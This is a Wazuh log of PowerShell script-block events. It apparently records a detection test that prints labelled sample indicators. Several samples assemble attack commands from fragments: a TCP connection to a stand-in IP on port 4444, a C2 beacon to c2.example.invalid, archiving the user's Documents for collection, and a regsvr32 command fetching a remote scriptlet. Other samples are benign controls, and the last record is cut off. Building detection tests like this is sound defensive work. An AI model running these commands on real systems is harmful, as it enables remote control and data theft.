{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"777b26ba-ee04-437a-874f-e8e9450b38f9","scriptBlockText":"$sampleId='PST-001'; $parts=@('$client=New-Obj','ect System.Net.','Sockets.TcpC','lient(''203.0.113.','77'',4444); $','stream=$client.Ge','tStream(); ','$buffer=New-Objec','t byte[] 40','96; $read=$strea','m.Read($buffer,','0,$buffer.Length)'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721274","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-001'; $parts=@('$client=New-Obj','ect System.Net.','Sockets.TcpC','lient(''203.0.113.','77'',4444); $','stream=$client.Ge','tStream(); ','$buffer=New-Objec','t byte[] 40','96; $read=$strea','m.Read($buffer,','0,$buffer.Length)'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 777b26ba-ee04-437a-874f-e8e9450b38f9\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:23.7572981Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:23.7572981Z\",\"eventRecordID\":\"721274\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-001'; $parts=@('$client=New-Obj','ect System.Net.','Sockets.TcpC','lient(''203.0.113.','77'',4444); $','stream=$client.Ge','tStream(); ','$buffer=New-Objec','t byte[] 40','96; $read=$strea','m.Read($buffer,','0,$buffer.Length)'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 777b26ba-ee04-437a-874f-e8e9450b38f9\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-001'; $parts=@('$client=New-Obj','ect System.Net.','Sockets.TcpC','lient(''203.0.113.','77'',4444); $','stream=$client.Ge','tStream(); ','$buffer=New-Objec','t byte[] 40','96; $read=$strea','m.Read($buffer,','0,$buffer.Length)'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"777b26ba-ee04-437a-874f-e8e9450b38f9\"}}}","id":"1784280924.369782","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:24.346+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"4f5c374f-24f4-4aa7-bc2f-5456705525f8","scriptBlockText":"$sampleId='PST-002'; $template = 'backup_path=%ProgramData%\\\\Company\\\\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721289","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-002'; $template = 'backup_path=%ProgramData%\\Company\\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 4f5c374f-24f4-4aa7-bc2f-5456705525f8\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:24.1662059Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:24.1662059Z\",\"eventRecordID\":\"721289\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-002'; $template = 'backup_path=%ProgramData%\\\\Company\\\\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 4f5c374f-24f4-4aa7-bc2f-5456705525f8\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-002'; $template = 'backup_path=%ProgramData%\\\\\\\\Company\\\\\\\\Backups; window=nightly'; [Environment]::ExpandEnvironmentVariables($template); Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"4f5c374f-24f4-4aa7-bc2f-5456705525f8\"}}}","id":"1784280924.369782","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:24.582+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"dd8b2dc8-0fa1-41ea-8dce-e7a513fcb77b","scriptBlockText":"$sampleId='PST-003'; $parts=@('$profile=','@{Sleep=6','0000;Jitte','r=0.25;Use','rAgent=''Mozil','la/5.0'';Uri=''','/api/v1/status''}','; Invoke-WebR','equest -Uri ''htt','ps://c2.exam','ple.invalid/a','pi/v1/status'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721292","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-003'; $parts=@('$profile=','@{Sleep=6','0000;Jitte','r=0.25;Use','rAgent=''Mozil','la/5.0'';Uri=''','/api/v1/status''}','; Invoke-WebR','equest -Uri ''htt','ps://c2.exam','ple.invalid/a','pi/v1/status'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: dd8b2dc8-0fa1-41ea-8dce-e7a513fcb77b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:24.5070609Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:24.5070609Z\",\"eventRecordID\":\"721292\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-003'; $parts=@('$profile=','@{Sleep=6','0000;Jitte','r=0.25;Use','rAgent=''Mozil','la/5.0'';Uri=''','/api/v1/status''}','; Invoke-WebR','equest -Uri ''htt','ps://c2.exam','ple.invalid/a','pi/v1/status'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: dd8b2dc8-0fa1-41ea-8dce-e7a513fcb77b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-003'; $parts=@('$profile=','@{Sleep=6','0000;Jitte','r=0.25;Use','rAgent=''Mozil','la/5.0'';Uri=''','/api/v1/status''}','; Invoke-WebR','equest -Uri ''htt','ps://c2.exam','ple.invalid/a','pi/v1/status'''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"dd8b2dc8-0fa1-41ea-8dce-e7a513fcb77b\"}}}","id":"1784280925.369782","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:25.260+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"68622779-1caf-4164-abe4-0e23fa361c76","scriptBlockText":"$sampleId='PST-004'; $parts=@('Get-ChildIte','m ''$env:USE','RPROFIL','E\\\\Docume','nts'' -','Recurse | Co','mpress-Arch','ive -Dest','inationPa','th ''$','env:TEMP\\\\co','llect.zip',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721298","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-004'; $parts=@('Get-ChildIte','m ''$env:USE','RPROFIL','E\\Docume','nts'' -','Recurse | Co','mpress-Arch','ive -Dest','inationPa','th ''$','env:TEMP\\co','llect.zip',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 68622779-1caf-4164-abe4-0e23fa361c76\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:24.8512906Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:24.8512906Z\",\"eventRecordID\":\"721298\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-004'; $parts=@('Get-ChildIte','m ''$env:USE','RPROFIL','E\\\\Docume','nts'' -','Recurse | Co','mpress-Arch','ive -Dest','inationPa','th ''$','env:TEMP\\\\co','llect.zip',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 68622779-1caf-4164-abe4-0e23fa361c76\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-004'; $parts=@('Get-ChildIte','m ''$env:USE','RPROFIL','E\\\\\\\\Docume','nts'' -','Recurse | Co','mpress-Arch','ive -Dest','inationPa','th ''$','env:TEMP\\\\\\\\co','llect.zip',''''); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"68622779-1caf-4164-abe4-0e23fa361c76\"}}}","id":"1784280925.369782","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:25.276+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"953ef77d-a0f3-4116-ae94-dc9f6de670c0","scriptBlockText":"$sampleId='PST-005'; $parts=@('gEt-PrOc','E`Ss',' | S','El`eCt','-oB`J','eCT NAmE,','Id,p','AtH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721301","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-005'; $parts=@('gEt-PrOc','E`Ss',' | S','El`eCt','-oB`J','eCT NAmE,','Id,p','AtH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 953ef77d-a0f3-4116-ae94-dc9f6de670c0\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:25.1917291Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:25.1917291Z\",\"eventRecordID\":\"721301\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-005'; $parts=@('gEt-PrOc','E`Ss',' | S','El`eCt','-oB`J','eCT NAmE,','Id,p','AtH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 953ef77d-a0f3-4116-ae94-dc9f6de670c0\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-005'; $parts=@('gEt-PrOc','E`Ss',' | S','El`eCt','-oB`J','eCT NAmE,','Id,p','AtH'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"953ef77d-a0f3-4116-ae94-dc9f6de670c0\"}}}","id":"1784280925.369782","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:25.283+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"fde79fe3-5839-4518-8cfc-b38b6ab035a4","scriptBlockText":"$sampleId='PST-006'; Get-Service | Select-Object -First 8 Name, Status; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721306","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-006'; Get-Service | Select-Object -First 8 Name, Status; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: fde79fe3-5839-4518-8cfc-b38b6ab035a4\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:25.5393064Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:25.5393064Z\",\"eventRecordID\":\"721306\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-006'; Get-Service | Select-Object -First 8 Name, Status; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: fde79fe3-5839-4518-8cfc-b38b6ab035a4\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-006'; Get-Service | Select-Object -First 8 Name, Status; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"fde79fe3-5839-4518-8cfc-b38b6ab035a4\"}}}","id":"1784280926.369782","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:26.289+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8205fa2f-e9fb-4659-a6b0-638e4083a988","scriptBlockText":"$sampleId='PST-007'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721321","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-007'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8205fa2f-e9fb-4659-a6b0-638e4083a988\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:25.9407615Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:25.9407615Z\",\"eventRecordID\":\"721321\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-007'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8205fa2f-e9fb-4659-a6b0-638e4083a988\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-007'; Get-Module -ListAvailable | Select-Object -First 5 Name, Version; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8205fa2f-e9fb-4659-a6b0-638e4083a988\"}}}","id":"1784280926.369782","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:26.320+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"66069552-91e3-44f8-80ca-82b0a3fa20e4","scriptBlockText":"$sampleId='PST-008'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721417","keywords":"0x0","level":"3","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-008'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 66069552-91e3-44f8-80ca-82b0a3fa20e4\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"WARNING","systemTime":"2026-07-17T09:35:33.5952252Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"3\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:33.5952252Z\",\"eventRecordID\":\"721417\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"WARNING\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-008'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 66069552-91e3-44f8-80ca-82b0a3fa20e4\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-008'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"66069552-91e3-44f8-80ca-82b0a3fa20e4\"}}}","id":"1784280934.370026","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:34.510+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"fafedcde-d6a2-477f-a45b-7a1cfe464c33","scriptBlockText":"$sampleId='PST-009'; $indicator='regs`vr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scro`bj.dll'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721431","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-009'; $indicator='regs`vr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scro`bj.dll'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: fafedcde-d6a2-477f-a45b-7a1cfe464c33\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:33.9849086Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:33.9849086Z\",\"eventRecordID\":\"721431\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-009'; $indicator='regs`vr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scro`bj.dll'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: fafedcde-d6a2-477f-a45b-7a1cfe464c33\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-009'; $indicator='regs`vr32.exe /s /n /u /i:https://reg.example.invalid/a.sct scro`bj.dll'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"fafedcde-d6a2-477f-a45b-7a1cfe464c33\"}}}","id":"1784280934.370026","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:34.655+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"2643a03f-5ea6-44b8-abc2-5117734d10c3","scriptBlockText":"$sampleId='PST-010'; $indicator='Get-Child' + 'Item ''$env:USE' + 'RPROFILE' + '\\\\Documents'' -R' + 'ecurse | Co' + 'mpress-Arc' + 'hive -Desti' + 'nationPath ''$e' + 'nv:TEMP\\\\' + 'collect.zip'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721433","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-010'; $indicator='Get-Child' + 'Item ''$env:USE' + 'RPROFILE' + '\\Documents'' -R' + 'ecurse | Co' + 'mpress-Arc' + 'hive -Desti' + 'nationPath ''$e' + 'nv:TEMP\\' + 'collect.zip'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 2643a03f-5ea6-44b8-abc2-5117734d10c3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:34.3149102Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:34.3149102Z\",\"eventRecordID\":\"721433\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-010'; $indicator='Get-Child' + 'Item ''$env:USE' + 'RPROFILE' + '\\\\Documents'' -R' + 'ecurse | Co' + 'mpress-Arc' + 'hive -Desti' + 'nationPath ''$e' + 'nv:TEMP\\\\' + 'collect.zip'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 2643a03f-5ea6-44b8-abc2-5117734d10c3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-010'; $indicator='Get-Child' + 'Item ''$env:USE' + 'RPROFILE' + '\\\\\\\\Documents'' -R' + 'ecurse | Co' + 'mpress-Arc' + 'hive -Desti' + 'nationPath ''$e' + 